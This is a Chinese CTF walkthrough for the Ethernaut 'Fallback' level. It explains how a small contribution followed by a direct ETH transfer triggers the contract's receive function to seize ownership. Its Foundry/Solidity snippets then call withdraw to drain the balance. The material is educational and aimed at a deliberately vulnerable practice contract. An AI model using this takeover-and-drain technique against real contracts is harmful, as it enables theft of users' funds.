# Fallback

## 题目描述

[原题 in Sepolia](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)

通过这关你需要

1. 获得这个合约的所有权
2. 把这个合约的的余额减到0

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Fallback -vvvvv
```

## 功能简述

1. 合约中有两个地方可以替换owner

    contribute函数

    ```solidity
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if(contributions[msg.sender] > contributions[owner]) {
          owner = msg.sender;
        }
      }
    ```

    receive函数

    ```solidity
    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
    ```

2. 使用contribute函数进行攻击，需要我们比owner还要有钱

    查询合约owner有多少余额，1000贡献（1000ETH）

    ```solidity
    constructor() {
    	owner = msg.sender;
    	contributions[msg.sender] = 1000 * (1 ether);
    }
    ```

    虽然我们可以使用Foundry进行钞能力攻击，但......

3. 使用receive函数进行攻击，需要我们给合约转一笔钱并且还需要我们在合约中的余额大于0。所以先给合约贡献一点钱，再给合约转一笔钱。

    ```solidity
    Fallback(payable(fallBack)).contribute{value: 1}();
    
    (bool success, bytes memory data) = payable(fallBack).call{value: 1}("");
    if (!success) {
    	revert(string(data));
    }
    ```

    即可获取到合约的owner。

    ```solidity
    address owner = Fallback(payable(fallBack)).owner();
    assertEq(owner, address(this));
    ```

4. 最后把合约中的钱转走

    ```solidity
    Fallback(payable(fallBack)).withdraw();
    ```

5. 提交合约实例，完成目标。

